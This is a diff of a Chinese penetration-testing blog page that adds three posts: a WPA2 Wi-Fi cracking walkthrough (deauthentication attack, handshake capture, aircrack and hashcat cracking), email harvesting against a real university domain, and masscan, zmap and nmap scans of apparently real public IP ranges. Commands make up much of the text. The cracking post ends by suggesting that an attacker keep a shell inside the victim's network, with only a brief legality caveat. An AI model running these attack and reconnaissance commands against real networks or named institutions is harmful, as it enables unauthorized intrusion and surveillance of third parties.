@@ -139,6 +139,433 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2015/04/14/aircrack-hascat/">
+                aircrack & hashcat 非字典高速破解目标无线密码
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2015-04-14</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/wpa-wpa2-crack/">wpa/wpa2 crack</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>0x01 挂载好外置无线网卡<br>&nbsp;&nbsp;&nbsp;&nbsp;把用于抓包的无线网卡挂到kali中,正常情况下,网卡在成功载入系统后,应该是如下的效果,在虚拟机设置中选择’可移动设备’把你的网卡连到虚拟机里<br><img src="/img/1.png" alt="&quot;将网卡载入kali&quot;"><br>如下图可以看到系统已自动识别该网卡,并且已自动搜到附近的无线信号<br><img src="/img/2.png" alt="查看系统是否已经识别该网卡"><br><img src="/img/3.png" alt="看看能不能收到附近的无线信号"></p>
+<p>0x02 检查无线网卡驱动是否能正常工作<br>&nbsp;&nbsp;&nbsp;&nbsp;紧接着,来看下当前系统中是否已经识别出该无线网卡的驱动,假设当前系统内核中已经有了该种无线网卡的驱动,它就会直接显示出当前无线网卡所使用的芯片组,可以看到,我这里用的是RT2800的芯片组(推荐大家直接去某宝买),如果没有,则可能需要你自己去手工编译安装相应的无线网卡驱动,然后再更新下内核模块即可(在linux中编译安装驱动着实是一件比较麻烦的事情,建议买的时候就直接去买aircrack所支持的网卡型号,起码用的时候不至于这么费劲,要相信万能的某宝),但这并不代表你只要把无线网卡驱动安装好就可以用了,需要搞清楚的是,你所使用的无线网卡芯片组必须要被aircrack所支持才可以,因为用无线网卡的最终目的还是用来捕获握手包<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> airmon-ng  查看当前系统中的所有可用的无线网卡接口</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/4.png" alt="看看aircrack是否已经识别芯片组"><br></p>
+<p>0x03 关于aircrack所支持的网卡芯片组列表,请自行参考aircrack官方说明:<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>//www.aircrack-ng<span class="meta">.org</span>/doku.php?id=compatibility_drivers</div></pre></td></tr></table></figure></p>
+<p>0x04 为了保证aircrack套件在运行的时候不被其他进程所干扰,我们需要先执行以下命令<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> airmon-ng check <span class="built_in">kill</span></span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/5.png" alt="aircrack启动检查"></p>
+<p>0x05 可以看到,当前网卡默认还处在管理模式,这时我们需要手动将其变成监听模式,这样才能进行正常的抓包<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> iwconfig  使用此命令可查看无线网卡的当前工作模式</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/6.png" alt="查看网卡工作模式"><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> airmon-ng start wlan0   把网卡改为监听模式</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/7.png" alt="将网卡切换为监听模式"><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> iwconfig  再次查看无线网卡工作模式是否真的已经改过来了</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/45.png" alt="看看网卡工作模式是否已经切换成功"></p>
+<p>0x06<br>&nbsp;&nbsp;&nbsp;&nbsp;另外,你的无线网卡在启动监听模式以后,网卡接口名称就变成了wlan0mon,以后只要是在aircrack套件中需要指定网卡接口名称的,都要用这个名字,在老版本的aircrack中默认名称是mon0,而新版本则统一变成了wlan0mon,恩,一切准备就绪之后,我们开始尝试扫描附近的无线接入点,找个有客户端在线的再单独监听,一定要注意,”必须要有客户端在线”,否则是抓不到包的,这也是整个无线破解最核心的地方,因为我们要把对方蹬掉线,才能截获他的握手包<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> airodump-ng wlan0mon 开始尝试扫描附近的无线信号,这里就用我们自己的wifi来进行测试,用于测试的wifi的mac和热点名称如下(klionsec)</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/8.png" alt="扫描附近的无线信号"></p>
+<p>0x07<br>&nbsp;&nbsp;&nbsp;&nbsp;通过上面的扫描,我们选定了名称为”klionsec”的wpa2无线热点作为我们的攻击目标,这里我们需要先记录下目标无线的工作信道以及对应的mac,(后面单独监听时需要用到这些信息),而后,单独监听目标无线热点,注意这里在监听目标无线的过程中不要断开,直到整个抓包过程完成为止,接下来要做的事情就是等待客户端上线,然后进行抓包,例如,下面就表示有一个客户端在线,其实,抓握手包的原理就是先把这个在线的用户给蹬掉线,然后再截获它的握手包,而这个包里就有我们想要的无线密码<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">airodump-ng</span> <span class="selector-tag">--bssid</span> <span class="selector-tag">DC</span><span class="selector-pseudo">:EE</span><span class="selector-pseudo">:06</span><span class="selector-pseudo">:96</span><span class="selector-pseudo">:B7</span><span class="selector-pseudo">:B8</span> <span class="selector-tag">-c</span> 6 <span class="selector-tag">-w</span> <span class="selector-tag">sec</span> <span class="selector-tag">wlan0mon</span> 监听目标无线,并把截获到的数据写到指定文件中</div></pre></td></tr></table></figure></p>
+<p><img src="/img/9.png" alt="单独监听目标无线"></p>
+<p>0x08<br>&nbsp;&nbsp;&nbsp;&nbsp;发现客户端在线稳定后,就可以向目标发射’ddos’流量了,直到我们在监听的终端下看到有握手包出现为止,如果第一轮包发完成后,并没看到握手包,别着急,先等个几十秒,或者隔个五六秒再发一次即可,正常情况下,基本一次就能搞定<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">aireplay-ng</span> <span class="selector-tag">--deauth</span> 15 <span class="selector-tag">-a</span> <span class="selector-tag">DC</span><span class="selector-pseudo">:EE</span><span class="selector-pseudo">:06</span><span class="selector-pseudo">:96</span><span class="selector-pseudo">:B7</span><span class="selector-pseudo">:B8</span> <span class="selector-tag">wlan0mon</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/10.png" alt="开始发动ddos攻击"></p>
+<p>可以看到,这时握手包已被正常抓获,此时监听也就可以断开了,注意观察终端的右上角,那个带有<code>handshake</code>标志的就是握手包的意思<br><img src="/img/11.png" alt="成功获取握手包"></p>
+<p>0x09<br>&nbsp;&nbsp;&nbsp;&nbsp;在我们抓获握手包以后,接下来的事情就非常简单了,你可以直接用aircrack加载弱口令字典进行爆破,当然,个人是十分不建议用字典(效率,实用性,太低,过于浪费时间),推荐大家直接把包处理一下丢给hashcat或者某宝去跑就行了,两种方法具体操作如下:</p>
+<p>(1)第一种,利用aircrack加载字典进行爆破,反正我自己很少用,基本没用过,先不说速度如何,关键还是看你的字典是否靠谱,实际测试中,个人并不建议用,因为根本没有靠谱性可言,因为这里仅仅是测试,实际渗透中,哪有太多的时间让你去跑[比如,实地渗透]<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">aircrack-ng</span> <span class="selector-tag">--bssid</span> <span class="selector-tag">DC</span><span class="selector-pseudo">:EE</span><span class="selector-pseudo">:06</span><span class="selector-pseudo">:96</span><span class="selector-pseudo">:B7</span><span class="selector-pseudo">:B8</span> <span class="selector-tag">-w</span> <span class="selector-tag">pass</span><span class="selector-class">.txt</span> <span class="selector-tag">sec-01</span><span class="selector-class">.cap</span>   会有三个文件,但最终的密码在<span class="selector-tag">cap</span>文件</div></pre></td></tr></table></figure></p>
+<p><img src="/img/12.png" alt="破解握手包中的无线密码"></p>
+<p>(2)第二种,直接利用hashcat跑hash,不过需要你事先稍微整理下数据包<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">wpaclean</span> <span class="selector-tag">wpapass</span><span class="selector-class">.cap</span> <span class="selector-tag">sec-01</span><span class="selector-class">.cap</span>  	  可以看到这里已经成功识别出了目标无线<span class="selector-tag">id</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/13.png" alt="提取数据包中的hash"><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> aircrack-ng wpapass.cap -J wpahash  把数据包转换成hashcat能认识的<span class="built_in">hash</span>类型</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/15.png" alt="转换成hashcat认识的hash格式"><br><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hashcat -m 2500 -a 3 wpahash.hccap ?u?l?l?l?l?d?d?d  因为我事先已经知道密码,所以直接这样给掩码会跑的更快一些</span></div></pre></td></tr></table></figure></p>
+<p>下面是hashcat的破解结果,可以看到,像这种密码,对于hashcat来讲,几乎是瞬间就被秒出来了,因为事先忘记了把wifi改的简单点(<code>汗……</code>),所以这里不得不拿之前的一个测试案例来说明了,因为这次用于测试的wifi密码比较复杂,要是硬破,估计明年也破不出来,所以没必要在这里浪费时间,重要的是把方法告诉大家就好,测试结果并不是最重要的,能把要说明的问题说清楚即可<br><img src="/img/hash.png" alt="破解结果"><br></p>
+<p>0x10<br>&nbsp;&nbsp;&nbsp;&nbsp;至此,整个无线密码破解的经典步骤就算完成了,纵观全文,其实,并没多少技术含量在里面,跟着我的文档一步步的来,抓个包,跑个密码基本还是没什么问题的,其实,如果真的特别想关注底层的细节,不妨自己通过wireshark手工完成这一过程,可以明确告诉大家的是,这样是绝对可行的,请自行尝试<br><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;在破解无线密码的问题上,大家大可不用太过纠结,破密码的最终目的,也是希望能通过这种方式来在目标上开个口子,仅此而已,如果真的是哪天运气爆棚,直接捅到目标的办公网,自然是求之不得,因为毕竟是在实地,可能留给我们的时间也不会太多,更会有诸多不便,想短时间内把整个内网摸透,可能也来不及,但想办法先在目标内网留个shell稳住入口,回去接着慢慢搞,还是可行的,一般对于从外部打进去非常难的情况下,这也许也是一种切实可行的渗透手段,祝大家好运吧,不过,最后,还是有句话不得不提醒大家,访问未授权的系统本身就是违法的,望大家洁身自好……!</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2014/12/22/email-collector/">
+                web渗透第一步之信息搜集  [ 搜集目标邮箱 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2014-12-22</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/email-collect/">email collect</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>00x1 theharvester 主要用来从各种搜索引擎上抓取目标的邮箱,子域以及ip反查(虚拟主机),可自行更换其代码中的各种搜索api<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">theharvester</span> <span class="selector-tag">-d</span> <span class="selector-tag">polyu</span><span class="selector-class">.edu</span><span class="selector-class">.hk</span> <span class="selector-tag">-l</span> 1000 <span class="selector-tag">-b</span> <span class="selector-tag">all</span> &gt;&gt; <span class="selector-tag">res</span><span class="selector-class">.txt</span>   <span class="selector-tag">-f</span> 选项貌似不太好使,只能重定向了</div></pre></td></tr></table></figure></p>
+<p><img src="/img/theharvester email.png" alt=""><br></p>
+<p>00x2 Maltego 一款老牌的纯图形化信息搜集工具,里面也提供了邮箱搜集功能,把结果导出为csv即可,使用非常简单,就不多啰嗦了,当然,作为一款老牌的专业信息搜集工具,它现在所支持的功能远远不止于此,后续有时间我们再单独细说<br><img src="/img/ltego email.png" alt=""><br></p>
+<p>00x3 在msf中同样也提供了一个比较粗糙的邮件搜集模块[search_email_collector][搜集范围确实很有限,暂时只能从谷歌(可能还不太好使),雅虎,bing上去爬]<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">msf &gt; use auxiliary/gather/search_email_collector </div><div class="line">msf auxiliary(search_email_collector) &gt; show options </div><div class="line">Module options (auxiliary/gather/search_email_collector):</div><div class="line">   Name           Current Setting  Required  Description</div><div class="line">   ----           ---------------  --------  -----------</div><div class="line">   DOMAIN                          <span class="literal">yes</span>       The domain name <span class="keyword">to</span> locate email addresses <span class="keyword">for</span></div><div class="line">   OUTFILE                         <span class="literal">no</span>        A filename <span class="keyword">to</span> store the generated email list</div><div class="line">   SEARCH_BING    <span class="literal">true</span>             <span class="literal">yes</span>       <span class="builtin-name">Enable</span> Bing as a backend search engine</div><div class="line">   SEARCH_GOOGLE  <span class="literal">true</span>             <span class="literal">yes</span>       <span class="builtin-name">Enable</span> Google as a backend search engine</div><div class="line">   SEARCH_YAHOO   <span class="literal">true</span>             <span class="literal">yes</span>       <span class="builtin-name">Enable</span> Yahoo! as a backend search engine</div><div class="line"></div><div class="line">msf auxiliary(search_email_collector) &gt; <span class="builtin-name">set</span> domain polyu.edu.hk</div><div class="line">msf auxiliary(search_email_collector) &gt; run</div></pre></td></tr></table></figure></p>
+<p><img src="/img/msf collector email.png" alt=""><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2014/12/20/port-hacking/">
+                web渗透第一步之信息搜集  [ 端口渗透 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2014-12-20</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/port-hacking/">port hacking</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>1,个人认为最靠谱的端口扫描工具,非telnet莫属,没有之一,如果你只是想快速地探测目标的某几个tcp端口是否开放,直接telnet一下,无疑是极好的也根本犯不着用什么专业端口扫描工具去抱着扫,这样做可以有效避免因某些工具动静儿太大,所造成的一些不必要的麻烦,如,触发对方防护报警,简单使用实例,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># telnet cciv.cityu.edu.hk 443</span></div><div class="line"><span class="comment"># telnet cciv.cityu.edu.hk 3389</span></div></pre></td></tr></table></figure></p>
+<p><br><br>2,除了用telnet对某单个机器进行快速的端口探测之外,如果我们想短时间内对多个目标批量进行端口扫描,又该怎么办呢,这里就来简单介绍下两款自己常用的公网端口扫描工具,masscan和zmap,同是基于无状态的的端口扫描,顺便科普下什么是无状态,简单来说,普通的端口扫描工具,在发出请求包以后还有一个等待数据回应的过程,然后根据回应的数据包头标志(不同系统平台的协议栈对每种标志的数据包响应状态是不一样的)以此来判断某个端口或者服务是是否开放,是什么操作系统等等……但这样做,无疑会很大程度上拖慢扫描速度,所以,后来大牛们就搞出了无状态扫描,这就意味着,当请求包发送以后就被不再管了,也不再等待回应,所有的验证都放在数据包本身,这可能也是它快的主要原因,另外,此类工具为了减少触发目标ids的几率,都采用了一种分组扫描算法,让扫描的ip随机分布[尽可能规避目标防护],而不是密麻集中在某个点……好了,简单科普就先到这里,过深的东西,也不是我目前的能力所能企及的,关键我们能把工具用起来就行,接着就来介绍下两款工具的一些常规用法,实际渗透中,个人更推荐masscan…原因我这里不多嘴了,自行慢慢体会吧<br><br><br>3,masscan [扫描速度取决于你的实际带宽,默认只扫描tcp端口,但也可扫udp]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>/<span class="regexp">/github.com/robertdavidgraham</span><span class="regexp">/masscan</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">masscan 常用选项:</div><div class="line"></div><div class="line">-p 	指定要扫描的端口,多个端口用逗号隔开</div><div class="line">--rate  	指定发包速率</div><div class="line">--open-only 	仅仅显示开放的端口 </div><div class="line">--banners 	获取banners</div><div class="line">-c      使用自定义的扫描配置文件</div><div class="line">--ping  扫之前是否要ping下</div><div class="line">-oL     把扫描结果保存到指定文件中</div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">masscan 配置文件格式,如下:</div><div class="line"><span class="comment">#klion masscan     	# '#'表注释</span></div><div class="line">rate =<span class="number">1000.00</span>       	<span class="comment"># 指定发包速率,根据自己的实际带宽计算</span></div><div class="line">output-format=list 	<span class="comment"># 指定扫描结果保存的文件格式</span></div><div class="line">output-status=open 	<span class="comment"># 只保存开放的端口信息</span></div><div class="line">output-filename=<span class="regexp">/root/</span>Desktop/port_hacking.txt 	<span class="comment"># 指定要把扫描的结果文件保存到哪里</span></div><div class="line">ports=<span class="number">80</span>,<span class="number">443</span>,<span class="number">8080</span>,<span class="symbol">U:</span><span class="number">53</span>  <span class="comment"># 指定要扫描的端口,默认tcp,当然,你也可以指定UDP的端口,U即udp </span></div><div class="line">range=<span class="number">203.174</span>.<span class="number">48.0</span>/<span class="number">24</span>   <span class="comment"># 指定要扫描的ip端,可以连续多个,记得逗号隔开就好了</span></div><div class="line">ping=<span class="literal">false</span>              <span class="comment"># 扫描的时候要不要先ping下,true表示真,即ping</span></div><div class="line">banners=<span class="literal">true</span>		<span class="comment"># 获取banner</span></div><div class="line">excludefile=<span class="regexp">/etc/zmap</span><span class="regexp">/blacklist.conf	# 指定不扫描的ip端,可以把不想扫描的一些ip加到这个文件中,如:内网ip段是不需要扫的</span></div></pre></td></tr></table></figure>
+<p><img src="/img/masscan config.png" alt=""><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">masscan 实例用法[支持同时进行tcp及udp扫描]:</div><div class="line"><span class="comment"># masscan --rate=1000 -p21,22,23,25,U:69,110,143,U:161,80,81,82,83,88,443,445,512,513,514,1433,1521,2082,2083,2181,2601,2604,3128,3690,4848,8088,8086,8081,8080,3306,5432,3389,5984,6379,7001,7002,8069,9200,9300,11211,10000,27017,27018,50000,50070,50030 --banners 202.181.132.0/24 103.15.135.0/24 203.174.48.0/24 203.124.10.0/24 202.65.218.0/24 202.181.196.0/24 -oL port_hacking.txt</span></div></pre></td></tr></table></figure>
+<p><img src="/img/masscan manual.png" alt=""><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># masscan -c masscan.conf  直接加载自定义配置进行扫描</span></div></pre></td></tr></table></figure>
+<p><img src="/img/masscan config res.png" alt=""><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">筛选特定服务特征:</div><div class="line"><span class="comment"># cat port_hacking.txt | grep "ProFTPD"</span></div><div class="line"><span class="comment"># cat port_hacking.txt | grep "vsFTPd"</span></div><div class="line"><span class="comment"># cat port_hacking.txt | grep "FileZilla Server"</span></div><div class="line"><span class="comment"># cat port_hacking.txt | grep "Microsoft FTP Service"</span></div><div class="line"><span class="comment"># cat port_hacking.txt | grep "Pure-FTPd"</span></div><div class="line"><span class="comment"># cat port_hacking.txt | grep "OpenSSH"</span></div><div class="line"><span class="comment"># cat port_hacking.txt | grep "Remote Management Console"</span></div><div class="line"><span class="comment"># cat port_hacking.txt | grep "User Access Verification"</span></div><div class="line"><span class="comment"># cat port_hacking.txt | grep "Welcome to the server management"</span></div><div class="line"><span class="comment"># cat port_hacking.txt | grep "imap"</span></div><div class="line"><span class="comment"># cat port_hacking.txt | grep "smtp"</span></div><div class="line"><span class="comment"># cat port_hacking.txt | grep "pop"</span></div><div class="line"><span class="comment"># cat port_hacking.txt | grep "snmp"</span></div></pre></td></tr></table></figure>
+<p><img src="/img/masscan manual ftp.png" alt=""><br></p>
+<p>4,zmap [扫描速度取决于你对的实际带宽,不过,在实际测试中准确率要比masscan稍差,同样的目标,masscan能扫出来,zmap却扫不出来]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">官方站点: <span class="symbol">https:</span>/<span class="regexp">/zmap.io</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">zmap常用选项:</div><div class="line">[注意:如果你要手工指定选项,就必须先把zmap.conf文件中的所有选项都注释掉,不然会出错,原因暂未知,貌似它默认应该会先读取这个文件,一般我都是直接注释掉,不用它默认的配置文件,而直接手工指定选项]:</div><div class="line">-p  指定要扫描的端口</div><div class="line">-b  指定扫描ip黑名单,如,内网ip,我们是不需要扫的</div><div class="line">-o  保存扫描结果到指定的文件中</div><div class="line">-w  可以把要扫描的ip段事先都放在一个文件中,进行批量扫描,注意格式,一行对应一个段[ip]</div><div class="line">-r  指定扫描发包速率</div><div class="line">-B  指定你的实际带宽,比如你带宽10M,实际指定4-6M即可</div><div class="line">-C  也可以直接加载自定义配置文件进行扫描</div><div class="line">-s  在扫描完成后进行简单汇总</div><div class="line">--probe-module=icmp_echoscan   	icmp模式扫描</div><div class="line">--probe-module=udp   		udp模式扫描</div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">zmap配置文件选项说明:</div><div class="line"></div><div class="line">interface <span class="string">"eth0"</span>   		<span class="comment"># 指定用于扫描的网卡接口</span></div><div class="line">probe-<span class="class"><span class="keyword">module</span> <span class="title">tcp_synscan</span>	<span class="comment"># 扫描模式,默认是是tcp的syn</span></span></div><div class="line">target-port <span class="number">3389</span>	<span class="comment"># 要扫描的端口</span></div><div class="line">rate <span class="number">100</span>		<span class="comment"># 设置发包速率</span></div><div class="line">bandwidth <span class="number">1</span>M		<span class="comment"># 设置带宽</span></div><div class="line">blacklist-file <span class="string">"/etc/zmap/blacklist.conf"</span>	<span class="comment"># 指定ip黑名单</span></div><div class="line">output-file <span class="string">"/root/Desktop/port_res.txt"</span>	<span class="comment"># 指定扫描结果的存放位置</span></div></pre></td></tr></table></figure>
+<p><img src="/img/zmap config.png" alt=""><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">zmap 常规用法[支持tcp,udp,icmp模式扫描,最好不要挂vpn扫,即使加上--vpn貌似也不太好使]:</div><div class="line"><span class="comment"># zmap -B 1M  -p [21,22,23,25,110,143,80,81,82,83,88,443,445,512,513,514,1433,1521,2082,2083,2181,2601,2604,3128,3690,4848,8088,8086,8081,8080,3306,5432,3389,5984,6379,7001,7002,8069,9200,9300,11211,10000,27017,27018,50000,50070,50030] -b /etc/zmap/blacklist.conf -r 1000 202.181.132.0/24 -o Desktop/port_res.txt</span></div></pre></td></tr></table></figure>
+<p><img src="/img/zmap mausal.png" alt=""><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># zmap -C /etc/zmap/zmap.conf 202.181.132.0/24  加载自定配置文件进行扫描</span></div></pre></td></tr></table></figure>
+<p><img src="/img/zmap config res.png" alt=""><br></p>
+<p>5,在用上面两款工具时,有些地方还是需要注意下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">实际使用中,最好先根据你的实际带宽估算下最合适的发包速率,因为你的带宽和发包的速率会直接影响扫描结果的准确性</div><div class="line">像这类的工具一般对带宽和速率的控制要求比较高,还有,在扫描之前它会预先提示你要扫描多少台机器,机器的多少也是根据你所给的掩码自动算出来的</div><div class="line">扫完以后,先随便telnet几个ip的端口,看看准确度如何,务必不要过度的依赖这些工具扫出来的结果</div><div class="line">不单单是针对这两款工具,对所有工具都是如此,理解作者的实际编写思路比使用工具本身更重要</div><div class="line">即使你暂时还写不出来很优秀的代码,但总有一天你会写出来的,嘿嘿……</div><div class="line">假如以后你想在这方面继续深入,这些都是很优秀的学习样板,所以过硬的编码能力在任何时候都跑不掉,贵在坚持嘛</div></pre></td></tr></table></figure></p>
+<p><br><br>6,最后再来看下老旧的 nmap,作为一款家喻户晓的探测工具,想必大家对它早已经非常熟悉[一直为人诟病的是老版本速度非常慢,可能是发包然后等待验证的过程比较复杂吧,不过,新版本确实已经改进不少],一般在linux目标机器中稍微懂一些的运维都会把这个预先装上,这样一来也极大的方便了我们:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nmap -v 192.168.3.240  扫描某单个目标[目标可以是域名,ip后者ip端]</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nmap -iL ip.txt  	同时扫描多个目标,把目标的ip事先放在一个文件中,每行对应一个ip</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nmap -Pn 192.168.3.240  	扫描前不要ping</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nmap -sV -v 192.168.3.240  探测远程主机的详细的服务列表[可能会耗时较长]</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nmap -O -v 192.168.3.240   探测远程操作系统版本类型</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">扫描自己指定的端口,默认如果不指定端口,它会自动扫描<span class="number">1000</span>个高危端口</div><div class="line"><span class="comment"># nmap -p 80,81,82,83,84,1433  192.168.3.189</span></div><div class="line"><span class="comment"># nmap -p U:53,111,137,T:21-25,80,139,8080 192.168.3.189</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">全面扫描目标主机的所有信息,包括操作系统,端口,服务,相当于-O -sV 的综合选项……</div><div class="line"><span class="comment"># nmap -A  -v 192.168.3.240</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">快速扫描整个C段,速度级别从<span class="number">0</span>到<span class="number">5</span>,默认用的icmp请求,极易被防火墙阻拦</div><div class="line"><span class="comment"># nmap -T5 -v 192.168.3.240</span></div><div class="line"><span class="comment"># nmap -T5 -v 192.168.3.0/24</span></div><div class="line"><span class="comment"># nmap -T5 --open 192.168.3.0/24</span></div><div class="line"><span class="comment"># nmap -v  192.168.3.1-10</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nmap --packet-trace  192.168.3.0/24  观察扫描时的详细发包过程</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nmap -sU 192.168.3.240  所谓隐蔽的UDP扫描,其实并不隐蔽</span></div></pre></td></tr></table></figure>
